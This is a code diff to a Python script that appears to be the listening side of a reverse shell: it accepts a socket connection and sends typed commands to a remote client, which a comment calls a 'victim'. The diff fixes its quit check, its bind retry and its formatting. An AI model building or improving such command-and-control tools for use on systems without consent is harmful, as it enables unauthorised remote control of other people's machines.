@@ -7,24 +7,28 @@ import socket
 hostname = socket.gethostname()
 
 ip_addr = socket.gethostbyname(hostname)
+
+
 def socket_accept(port):
     conn, address = s.accept()
     print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
     send_commands(conn, port)
     conn.close()
 
+
 # Send commands to client/victim or a friend
 def send_commands(conn, port):
     while True:
         cmd = input()
-        if cmd == 'quit' or "exit":
+        if cmd == 'quit':
             conn.close()
             s.close()
             sys.exit()
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024),"utf-8")
+            client_response = str(conn.recv(1024), "utf-8")
             print(client_response, end="")
+
 
 def create_socket(port):
     try:
@@ -50,14 +54,13 @@ def bind_socket(port):
 
     except socket.error as msg:
         print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
-        bind_socket()
+        bind_socket(port)
+
+
 def main(port):
     create_socket(port)
     bind_socket(port)
     socket_accept(port)
-
-
-
 
 
 while True:
@@ -75,10 +78,4 @@ while True:
         int_port = int(port)
         main(int_port)
 
-
 # Establish connection with a client (socket must be listening)
-
-
-
-
-
